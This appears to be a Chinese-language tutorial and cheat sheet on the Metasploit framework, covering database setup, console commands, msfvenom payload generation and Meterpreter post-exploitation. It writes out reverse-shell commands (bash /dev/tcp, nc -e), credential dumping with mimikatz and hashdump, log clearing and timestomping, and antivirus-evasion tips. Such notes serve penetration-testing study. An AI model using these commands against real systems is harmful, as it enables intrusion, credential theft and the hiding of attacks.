# Metasploit

该工具存在免费版本 Metasploit Framework 和付费版本 Metasploit Pro, 后者提供了许多实用的专业功能, 但是天价.  

## 数据库

初次使用 MSF 时可以利用 [msfdb](https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html) 对数据库进行自动初始化, 若自动初始化失败则进行[手动初始化](https://docs.rapid7.com/metasploit/managing-the-database/). 仅支持 [PostgreSQL](https://www.postgresql.org/) 数据库.  

```sh
sudo pacman -S postgresql                      # 安装数据库
sudo systemctl enable --now postgresql.service # 启用数据库服务
sudo systemctl status postgresql.service       # 检查数据库服务状态

msfdb status # 检查数据库服务状态, 包括监听端口
msfdb init   # 初始化数据库
```

其中启动数据库服务和初始化数据库的步骤容易出现错误, 根据提示信息进行故障排除即可.  
启动 msfconsole 后可以通过 `db_status` 检查数据库连接状态.  

之后便可以使用数据库相关指令, 关键信息(如主机/服务/漏洞/战利品)会被记录到数据库中以便后续查询.  

### 故障排除

msfdb 初始化数据库失败. 可以使用下面的源安装 `msfdb-blackarch`:  

```
[blackarch]
SigLevel = Optional TrustAll
Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch
```

## 快速入门

```sh
# 数据库/工作区
msf > workspace [name]             # 切换工作区
msf > workspace -a [name]          # 添加工作区
msf > db_nmap [...]                # 调用 nmap 进行扫描, 比将结果保存到当前工作区
msf > db_export -f [format] [file] # 将当前工作区中的数据以指定格式(通常是 xml)导出到文件中, 导出结果可能为空, 需要进行检查

# 查找/选择 module
msf > search [[type:]keyword] # 搜索 module
msf > use [id/module]         # 使用 module, module 的名称或 search 指令结果中的 id
msf > use [id/module]         # 显示 module 的详细信息.
msf > setg [option] [value]   # 设置默认选项, 避免切换 module 时重复填写不变的参数

# 使用 module
msf(module) > options                 # 显示当前 module 的选项
msf(module) > info                    # 显示当前 module 的详细信息
msf(module) > show [option]           # 显示选项的可用选项
msf(module) > set [option] [id/value] # 设置选项, 选项的值或 show 指令结果中的 id
msf(module) > check                   # 部分 exploit module 支持, 用于验证 RHOSTS 是否可以被利用
msf(module) > run                     # 执行 module

# 会话管理
msf > sessions         # 列出会话, -l
msf > sessions [id]    # 打开会话, -i
msf > sessions -u [id] # 将 shell 升级到 meterpreter

# 日志/故障排除
msf > setg LogLevel 5          # 日志详细等级, 范围 1-5
cat ~/.msf6/logs/framework.log # 查看日志
msf > debug                    # 显示诊断信息, 在故障发生后使用
```

## 生成载荷

使用 msfvenom(msfpayload 和 msfencode 的替代品) 来生成载荷, 详情请参考[官方教程](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).  
需要根据具体情况(包括漏洞利用方式, 架构, 系统, 环境, 通讯方式等)选择合适的载荷/编码器/格式等其他参数.  

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=[LHOST] LPORT=[LPORT] rc4password=[password] -f exe -o ~/payload.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST=[LHOST] LPORT=[LPORT]                        -f exe -o ~/payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp       LHOST=[LHOST] LPORT=[LPORT]                        -f elf -o ~/payload

msfvenom -l payload # 查看载荷, 根据目标进行选择
msfvenom -l format  # 查看格式, 可以是可执行文件/脚本, 也可以只是用于源代码的 shellcode 代码片段
```

除了上传可执行文件到目标并执行, 也可以直接利用目标上的命令来获取 shell, 然后再将 shell 升级为 meterpreter.  

```sh
bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1
nc [LHOST] [LPORT] -e /bin/sh
```

利用对应的 shell_reverse_tcp 建立连接.  

## [Meterpreter](https://github.com/rapid7/metasploit-payloads)

Meterpreter 是一种特殊的多功能载荷, 充分利用其功能可以使后渗透攻击变得十分方便.  
以下列举几个常用功能:  

```sh
# 权限提升
meterpreter > getsystem [...]   # 自动提权
meterpreter > steal_token [pid] # 通过窃取拥有更高权限的进程的令牌提权

# 获取密码
meterpreter > load mimikatz                          # 载入 mimikatz
meterpreter > run post/windows/gather/smart_hashdump # 导出账户密码 hash

# 清除痕迹
meterpreter > clearev         # 清除应用/系统/安全日志
meterpreter > timestomp [...] # 编辑文件属性(包括创建/最后修改时间)

# 使用 module
meterpreter > search type:post  # 列出 post module
meterpreter > run [module]      # 执行 module, 主要位于 "post/[system]" 下
```

### 故障排除

Meterpreter 会话意外关闭, 返回原因 Died / exploit/multi/handler 无法和目标建立连接 / 目标上的接收器发生段错误, 可能是又以下几个原因导致的:  

- Metasploit 和 Meterpreter 的版本不兼容: 解决方法是确保版本相同.
- Payload 不匹配: 该问题会导致目标上的接收器发生段错误, exploit/multi/handler 中设置的 payload(类型/系统/架构) 与目标上期待的不一致, 解决方法是确保 payload 一致.
- 被安全软件终止: 该问题会导致会话成功建立却意外关闭, 可能的解决方法有:  

    1. 转移进程: 通过 `set AutoRunScript "migrate -n explorer.exe"` 在链接建立后立即转移到其他进程, 以规避安全软件的检测.
    2. 混淆: 生成载荷时使用编码器混淆并加密代码, 以规避安全软件对内存中代码的特征检测. 或通过 `set EnableStageEncoding true` 对发送的 stage 进行编码, 以规避安全软件对流量特征的识别.

## 拓展

- [Metasploit Documentation](https://docs.metasploit.com/)
- <https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/>
- [mimikatz](https://github.com/ParrotSec/mimikatz)
